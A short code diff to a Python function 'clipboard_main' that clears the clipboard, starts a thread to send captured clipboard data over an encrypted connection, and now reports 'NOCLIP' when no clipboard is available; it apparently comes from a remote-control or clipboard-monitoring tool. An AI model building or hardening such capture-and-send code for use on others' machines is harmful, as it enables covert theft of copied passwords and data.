@@ -307,8 +307,15 @@ def clipboard_main(conn_obj):
     stop_flag = threading.Event()
     lock = threading.Lock()
 
-    # Clear clipboard to ensure new data is captured
-    pyperclip.copy("")
+    if not pyperclip.is_available():
+        conn_obj.sendall(encrypt_message("NOCLIP"))
+        return "Clipboard unavailable"
+
+    try:
+        pyperclip.copy("")
+    except pyperclip.PyperclipException:
+        conn_obj.sendall(encrypt_message("NOCLIP"))
+        return "Clipboard unavailable"
 
     def clipboard_sender() -> None:
         while not stop_flag.is_set():
